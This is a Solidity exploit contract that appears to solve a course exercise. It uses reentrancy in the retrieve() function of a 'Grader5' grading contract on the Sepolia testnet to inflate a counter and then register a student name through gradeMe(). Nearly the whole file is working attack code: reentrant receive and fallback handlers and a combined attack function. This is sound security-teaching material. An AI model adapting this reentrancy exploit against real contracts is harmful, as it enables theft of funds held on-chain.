// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/**
 * @title Grader5Attacker - Contract to exploit Grader5 vulnerabilities
 * @author Eduardo J. Moreno
 * @notice This contract exploits the reentrancy vulnerability in Grader5.retrieve()
 * @dev Educational purpose only - demonstrates security vulnerabilities
 * 
 * VULNERABILITY ANALYSIS:
 * 1. REENTRANCY: retrieve() calls external contract before updating state
 * 2. STATE MANIPULATION: Counter logic can be manipulated through reentrancy
 * 3. LOGIC FLAW: Counter reset to 0 when < 2, but incremented first
 * 
 * ATTACK VECTOR:
 * - Call retrieve() with > 3 wei
 * - In receive/fallback, call retrieve() again before first call completes
 * - This manipulates counter to reach the required value > 1 for gradeMe()
 */
contract Grader5Attacker {
    
    /// @notice Address of the target Grader5 contract on Sepolia
    address public constant TARGET_CONTRACT = 0x5733eE985e22eFF46F595376d79e31413b1A1e16;
    
    /// @notice Owner of this attacker contract
    address public immutable owner;
    
    /// @notice Attack state tracking
    uint256 private attackCount;
    bool private isAttacking;
    
    /// @notice Maximum number of reentrant calls to prevent gas limit issues
    uint256 private constant MAX_CALLS = 3;
    
    /**
     * @notice Events for tracking attack progress
     */
    event AttackInitiated(address indexed target, uint256 timestamp);
    event ReentrancyTriggered(uint256 callNumber, uint256 gasLeft);
    event AttackCompleted(bool success, string message);
    event GradingAttempted(string studentName, bool success);

    /**
     * @notice Custom errors for better gas efficiency
     */
    error NotOwner();
    error AttackInProgress();
    error InsufficientBalance();
    error AttackFailed(string reason);

    /**
     * @notice Contract constructor
     * @dev Sets the deployer as owner
     */
    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Modifier to restrict access to owner only
     */
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    /**
     * @notice Modifier to prevent reentrant calls during attack
     */
    modifier notAttacking() {
        if (isAttacking) revert AttackInProgress();
        _;
    }

    /**
     * @notice Main attack function to exploit Grader5 reentrancy
     * @dev Exploits the reentrancy vulnerability in retrieve() function
     */
    function executeAttack() external payable onlyOwner notAttacking {
        if (msg.value < 4 wei) revert InsufficientBalance();
        
        isAttacking = true;
        attackCount = 0;
        
        emit AttackInitiated(TARGET_CONTRACT, block.timestamp);
        
        // Call the vulnerable retrieve() function
        (bool success, bytes memory data) = TARGET_CONTRACT.call{value: msg.value}(
            abi.encodeWithSignature("retrieve()")
        );
        
        isAttacking = false;
        
        if (!success) {
            revert AttackFailed("Initial retrieve() call failed");
        }
        
        emit AttackCompleted(success, "Reentrancy attack executed successfully");
    }

    /**
     * @notice Receive function - triggered by Grader5.retrieve() callback
     * @dev This is where the reentrancy attack happens
     */
    receive() external payable {
        if (isAttacking && attackCount < MAX_CALLS) {
            attackCount++;
            emit ReentrancyTriggered(attackCount, gasleft());
            
            // Reentrant call to retrieve() - this is the exploit!
            (bool success,) = TARGET_CONTRACT.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            
            // Continue even if reentrant call fails to avoid reverting main attack
        }
    }

    /**
     * @notice Fallback function as backup for receive()
     */
    fallback() external payable {
        // Handle any remaining ETH or non-function calls
        if (isAttacking && attackCount < MAX_CALLS && msg.value > 0) {
            attackCount++;
            emit ReentrancyTriggered(attackCount, gasleft());
            
            (bool success,) = TARGET_CONTRACT.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
        }
    }

    /**
     * @notice Function to register student name in Grader5 after successful attack
     * @param studentName Name to register in the grading system
     * @dev Should be called after executeAttack() to register the name
     */
    function registerStudent(string calldata studentName) external onlyOwner {
        // Call gradeMe function on target contract
        (bool success, bytes memory data) = TARGET_CONTRACT.call(
            abi.encodeWithSignature("gradeMe(string)", studentName)
        );
        
        emit GradingAttempted(studentName, success);
        
        if (!success) {
            // Decode revert reason if available
            if (data.length > 0) {
                assembly {
                    let returndata_size := mload(data)
                    revert(add(32, data), returndata_size)
                }
            } else {
                revert AttackFailed("gradeMe() call failed");
            }
        }
    }

    /**
     * @notice Combined function to execute attack and register in one transaction
     * @param studentName Name to register after successful attack
     * @dev More gas efficient than separate calls
     */
    function attackAndRegister(string calldata studentName) external payable onlyOwner {
        // First execute the attack
        if (msg.value < 4 wei) revert InsufficientBalance();
        
        isAttacking = true;
        attackCount = 0;
        
        emit AttackInitiated(TARGET_CONTRACT, block.timestamp);
        
        // Execute reentrancy attack
        (bool attackSuccess,) = TARGET_CONTRACT.call{value: msg.value}(
            abi.encodeWithSignature("retrieve()")
        );
        
        isAttacking = false;
        
        if (!attackSuccess) {
            revert AttackFailed("Attack phase failed");
        }
        
        emit AttackCompleted(attackSuccess, "Attack successful, proceeding to registration");
        
        // Now register the student name
        (bool gradeSuccess, bytes memory data) = TARGET_CONTRACT.call(
            abi.encodeWithSignature("gradeMe(string)", studentName)
        );
        
        emit GradingAttempted(studentName, gradeSuccess);
        
        if (!gradeSuccess) {
            if (data.length > 0) {
                assembly {
                    let returndata_size := mload(data)
                    revert(add(32, data), returndata_size)
                }
            } else {
                revert AttackFailed("Registration failed after successful attack");
            }
        }
    }

    /**
     * @notice Check current counter value for this contract
     * @return Current counter value from Grader5
     */
    function checkCounter() external view returns (uint256) {
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }

    /**
     * @notice Check if already graded
     * @return Whether this contract address is already graded
     */
    function checkIfGraded() external view returns (bool) {
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        
        if (success && data.length >= 32) {
            return abi.decode(data, (bool));
        }
        return false;
    }

    /**
     * @notice Check student grade by name
     * @param studentName Name to check
     * @return Grade value for the student
     */
    function checkStudentGrade(string calldata studentName) external view returns (uint256) {
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("students(string)", studentName)
        );
        
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }

    /**
     * @notice Emergency function to withdraw any ETH from contract
     * @dev Only owner can withdraw
     */
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(owner).transfer(balance);
        }
    }

    /**
     * @notice Get contract balance
     * @return Current ETH balance of this contract
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Get detailed attack status information
     * @return isCurrentlyAttacking Whether attack is in progress
     * @return currentAttackCount Number of reentrant calls made
     * @return contractCounter Current counter value from target
     * @return alreadyGraded Whether already graded
     */
    function getAttackStatus() external view returns (
        bool isCurrentlyAttacking,
        uint256 currentAttackCount,
        uint256 contractCounter,
        bool alreadyGraded
    ) {
        isCurrentlyAttacking = isAttacking;
        currentAttackCount = attackCount;
        
        // Get counter from target contract
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        contractCounter = (success && data.length >= 32) ? abi.decode(data, (uint256)) : 0;
        
        // Get graded status
        (bool success2, bytes memory data2) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        alreadyGraded = (success2 && data2.length >= 32) ? abi.decode(data2, (bool)) : false;
    }
}
